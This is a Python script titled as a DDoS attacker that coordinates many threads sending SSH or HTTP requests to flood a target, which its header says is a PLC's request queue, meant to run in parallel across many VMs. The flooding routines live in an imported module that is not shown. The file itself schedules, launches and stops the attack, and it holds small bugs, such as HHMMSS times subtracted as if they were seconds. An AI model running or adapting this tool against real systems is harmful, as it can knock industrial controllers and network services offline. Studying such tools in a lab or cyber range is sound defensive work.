#-----------------------------------------------------------------------------
# Name:        DDos attacker.py
#
# Purpose:     A simple PLC request sender program try to full fill the target PLC's 
#              request handling queue. This program need to be run on multiple machine
#              with multiple thread. for example run 100 this program parallel 
#              on 10 vms.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

import os
import sys
import time
from datetime import datetime
import json

print("Current working directory is : %s" % os.getcwd())
DIR_PATH = dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

CONFIG_FILE_NAME = 'ddosAttackCfg.txt'

TOPDIR = 'src'
LIBDIR = 'lib'

SSH_ATK_TYPE = ('SSH', 'ssh')
HTTP_ATK_TYPE = ('URL', 'HTTP')

#-----------------------------------------------------------------------------
# find the lib directory
idx = dirpath.find(TOPDIR)
gTopDir = dirpath[:idx + len(TOPDIR)] if idx != -1 else dirpath   # found it - truncate right after TOPDIR
# Config the lib folder 
gLibDir = os.path.join(gTopDir, LIBDIR)
if os.path.exists(gLibDir):
    sys.path.insert(0, gLibDir)

# init the config loader
import ConfigLoader
gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()

# import the util function
import ddosAttackUtil

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class DDosAttacker(object):
    
    def __init__(self) -> None:
        self.threadPoolCount = int(CONFIG_DICT['ATK_TN']) if 'ATK_TN' in CONFIG_DICT.keys() else 20
        self.threadPool = []
        self.startT = int(CONFIG_DICT['ATK_ST']) if 'ATK_ST' in CONFIG_DICT.keys() else None
        self.endT = int(CONFIG_DICT['ATK_ET']) if 'ATK_ET' in CONFIG_DICT.keys() else None

        self.initThreadPool()

    #-----------------------------------------------------------------------------
    def _initSSHAtkPool(self, sshAtkParm):
        print("Start init the SSH DDoS attack.")
        for idx in range(self.threadPoolCount):
            threadID = 'ssh-Atk-%s' %str(idx)
            attckThreadClient = ddosAttackUtil.attackThreadSSH(self, threadID, None)
            attckThreadClient.initAttacker(sshAtkParm)
            self.threadPool.append(attckThreadClient)

    def _initHTTPAtkPool(self, httpAtkParm):
        print("Start init the SSH DDoS attack.")
        for idx in range(self.threadPoolCount):
            threadID = 'http-Atk-%s' %str(idx)
            attckThreadClient = ddosAttackUtil.attackThreadHttp(self, threadID, None)
            attckThreadClient.initAttacker(httpAtkParm)
            self.threadPool.append(attckThreadClient)


    #-----------------------------------------------------------------------------
    def initThreadPool(self):
        atkType =  CONFIG_DICT['ATK_TYPE']
        paramPath = os.path.join(DIR_PATH, CONFIG_DICT['ATK_JSON'])
        paramJson = None 
        with open(paramPath) as fh:
            paramJson = json.load(fh)
            
        if atkType in SSH_ATK_TYPE:
            self._initSSHAtkPool(paramJson)
        elif atkType in HTTP_ATK_TYPE: 
            self._initHTTPAtkPool(paramJson)
        
        # Start all the attack threads.
        for attckThreadClient in self.threadPool:
            attckThreadClient.start()
        print("All the attack theads ready.")

    #-----------------------------------------------------------------------------
    def run(self):
        # Start wait 
        nowT = int(datetime.now().strftime('%H%M%S'))
        if (not self.startT is None) and nowT <= self.startT:
            waitInv = self.startT - nowT
            print("- Wait %s min to start attack." %str(waitInv//60))
            time.sleep(waitInv)
        print("All thread start launch attack.")
        self.startAttack()
        while True and self.endT:
            time.sleep(1)
            now = int(datetime.now().strftime('%H%M%S'))
            if now >= self.endT:
                print("Stop attack.")
                self.stopAttack()
                break
    
    #-----------------------------------------------------------------------------
    def startAttack(self):
        for client in self.threadPool:
            client.setStartAtk(True)

    #-----------------------------------------------------------------------------
    def stopAttack(self):
        for client in self.threadPool:
            client.setStartAtk(False)

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    ddosAttacker = DDosAttacker()
    ddosAttacker.run()

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()


